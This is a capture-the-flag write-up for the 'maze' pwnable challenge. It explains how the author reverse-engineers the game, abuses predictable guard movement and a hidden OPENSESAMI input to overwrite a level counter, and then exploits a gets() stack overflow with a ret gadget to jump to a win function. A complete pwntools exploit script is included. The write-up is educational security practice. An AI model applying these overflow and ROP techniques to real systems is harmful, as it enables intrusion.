# Maze

This is the second challenge of the Grotesque category I've tackled on these last two days, and it seems interesting. I highly encourage playing it, and not reading this writeup instead. Only refer to it as an alternative solution.

Let's take a quick look at what happens when we run the binary:
```c
~/pwnable/maze$ ./maze
PLEASE BREAK OUT OF THIS MAZE
GO TO [] IN ORDER TO EXIT THE MAZE
WATCH THE GUARDIANS(^^) OF THE MAZE!
BE CAREFUL AND GOOD LUCK, SEE YOU AT 20'th LEVEL...
PRESS ANY KEY TO START THE GAME
```

Okay, so it seems as if a certain thing happens when we reach level 20.. Let's keep that in mind and look at the game:
```c
################################
##:D##          ##        ##  ##
##  ####  ####  ##  ##  ####  ##
##        ##        ##    ##  ##
####  ##########    ####      ##
##        ##      ##        ####
########  ##  ##      ####    ##
##    ##          ##  ##    ####
##  ##########  ####      ######
##                ######      ##
####  ######  ######  ######  ##
##            ##  ##      ##  ##
##      ##            ##      ##
##  ##  ############  ####  ####
##    ^^    ##              []##
################################
s
player at 1, 2
guard 0 at 2,14
################################
##  ##          ##        ##  ##
##:D####  ####  ##  ##  ####  ##
##        ##        ##    ##  ##
####  ##########    ####      ##
##        ##      ##        ####
########  ##  ##      ####    ##
##    ##          ##  ##    ####
##  ##########  ####      ######
##                ######      ##
####  ######  ######  ######  ##
##            ##  ##      ##  ##
##      ##            ##      ##
##  ##  ############  ####  ####
##  ^^      ##              []##
################################
player at 1, 2
guard 0 at 3,14
################################
##  ##          ##        ##  ##
##:D####  ####  ##  ##  ####  ##
##        ##        ##    ##  ##
####  ##########    ####      ##
##        ##      ##        ####
########  ##  ##      ####    ##
##    ##          ##  ##    ####
##  ##########  ####      ######
##                ######      ##
####  ######  ######  ######  ##
##            ##  ##      ##  ##
##      ##            ##      ##
##  ##  ############  ####  ####
##    ^^    ##              []##
################################
```

It is a proper game of maze, with a guard, etc. in which you need to get to the end.

Knowing the nature of the CTF, and admittedly trying, I was quickly met with the understanding that I cannot reach level 20 simply by abiding to the rules. Luckily, this is exactly the opposite of what we're here for. Let's open IDA.

Upon first look, I quickly noticed it lacks symbols. But, it's a small binary, so a little bit of string matching and logic can get you a long way.

For this challenge though, I figured I don't need much. So I mapped main as so:
![](/assets/images/writeups/maze/image.png)

We know something interesting happens at level 20, so let's take a look at the function at the end:
![](/assets/images/writeups/maze/image-1.png)

First thing that pops to mind is gets for a small buffer. 

Let's checksec:
![](/assets/images/writeups/maze/image-2.png)

Too ez.

Simply get to level 20 and you get free RIP control. 

But, how do we get to level 20? I started looking at the code of the game itself, at a high level look, and noticed a weird thing:
![](/assets/images/writeups/maze/image-3.png)
![](/assets/images/writeups/maze/image-4.png)

Hm. This seems interesting, from this code it seems as if we need to reach level 5 at least, and then reach x = 8, y = 14, and input this secret key in order to overwrite some random byte.

But, is this random?

If we use logic to deduce where our maze array is stored:
![](/assets/images/writeups/maze/image-6.png)

This byte seems to be right after the map in memory:
![](/assets/images/writeups/maze/image-5.png)

But, how does this help us? Well, let's do some math.

We know, from the offsetting used in the picture above, that the map is 16x16 bytes, or, 256 bytes overall. But, the map array is 0xf8, aka 248, meaning, we're writing a '0' to the map somewhere! 

If we calculate the offset (which is 248), we can deduce it is x = 8, y = 15. Meaning, we're basically deleting this rail here:
![](/assets/images/writeups/maze/image-7.png)

The first thing that pops to mind is that we can "escape" the maze and overwrite random values in the area. 

If we focus on our objective, we need a way to reach a higher level than we actually reached. So, we would hope the level_counter is somewhere in the area.

Luckily for us, it is:
![](/assets/images/writeups/maze/image-8.png)

So, all we need to do is overwrite it and then beat level 5 in order for the new level counter to take effect!

Also, another thing I've noticed is that the movement of the guards is determined by a rand() with a deterministic seed, thus granting a guarantee that if we pass a level or reach a point with certain moves, doing that exact combination will lead to the exact same position.

To get the combinations that'll lead me to each position is boring and took a lot of trial; so we'll skip the gruesome details and just assume we've reached this:

```py
io = start()

# Send anything to start the game.
io.send(b'j')

# Due to the fact that they randomize the locations of the guards via 
# a rand that is predictable, we can simply beat the first 4 levels on our own, 
# and write the way to beat them. 
# That way, we'll always beat them and we can simply get to the OPENSESAMI part!
beat_3_levels = 'ssdddwwdddssddwwwddssdssdssassddsssassd'

# Beat first 3 levels.
for i in range(3):
    io.send(beat_3_levels)

io.recvuntil("level 3")

beat_level_4 = 'ssdddwwdddssdssssassasssddddddssdddd'
io.send(beat_level_4)

io.recvuntil("level 4")

# j * 80 to get a better position of the guards.
get_to_open_sesami = 'ssdddwwdddssddwwddssdsdsssassdd' + 'j' * 80 + 'sssassaaaaa'
io.send(get_to_open_sesami)

# Get to the coordinates for the open sesami!
io.recvuntil("player at 8, 14")

# One extra character to open secret door! :)
io.send('OPENSESAMIJ'):
```

Now, after we send this, we can get to our exploitation part. Because of the fact that in each location we've been, we either write '0' (if we passed it) or 'S' (if we're there), we can overwrite the level_counter with this code:

```py
# Now go to y = 18, x = 8-4 to overwrite the levels counter :)
overwrite_levels = 'ssssaaaaddddwwwwdddddd'
io.send(overwrite_levels)
```

And now:
![](/assets/images/writeups/maze/image-9.png)

ez, we got a gets() call. 
Now, we can jump everywhere, but without a libc leak, etc., it's a chore. 

Luckily for us, if we look at the strings, we'll see this:

![](/assets/images/writeups/maze/image-10.png)

This most likely means that we have some kind of win function! 
If we actually go through the function, we can see this:
![](/assets/images/writeups/maze/image-11.png)

Let's just jump there!

Therefore, this is our exploit:
```py
rip_offset = 0x38
win = 0x4017b4

# Send winning payload and enjoy :)
io.recvuntil(b'record your name : ')
io.sendline(b'A' * rip_offset + p64(win))
```

Using this actually made us jump to system! But.. our $rsp was not aligned to 0x10, which causes a segfault in system.

Let's fix this using a gadget:
```py
rip_offset = 0x38
win = 0x4017b4
ret_gadget = 0x40079f

# Send winning payload and enjoy :)
io.recvuntil(b'record your name : ')
io.sendline(b'A' * rip_offset + p64(ret_gadget) + p64(win))
```

And then we r00t.

Full Exploit:

```py
io = start()

# Send anything to start the game.
io.send(b'j')

# Due to the fact that they randomize the locations of the guards via 
# a rand that is predictable, we can simply beat the first 4 levels on our own, 
# and write the way to beat them. 
# That way, we'll always beat them and we can simply get to the OPENSESAMI part!
beat_3_levels = 'ssdddwwdddssddwwwddssdssdssassddsssassd'

# Beat first 3 levels.
for i in range(3):
    io.send(beat_3_levels)

io.recvuntil("level 3")

beat_level_4 = 'ssdddwwdddssdssssassasssddddddssdddd'
io.send(beat_level_4)

io.recvuntil("level 4")

get_to_open_sesami = 'ssdddwwdddssddwwddssdsdsssassdd' + 'j' * 80 + 'sssassaaaaa'
io.send(get_to_open_sesami)

# Get to the coordinates for the open sesami!
io.recvuntil("player at 8, 14")

# One extra character to open secret door! :)
io.send('OPENSESAMIJ')

# Now go to y = 18, x = 8-4 to overwrite the levels counter :)
overwrite_levels = 'ssssaaaaddddwwwwdddddd'
io.send(overwrite_levels)

rip_offset = 0x38
win = 0x4017b4
ret_gadget = 0x40079f

# Send winning payload and enjoy :)
io.recvuntil(b'record your name : ')
io.sendline(b'A' * rip_offset + p64(ret_gadget) + p64(win))

io.interactive()
```
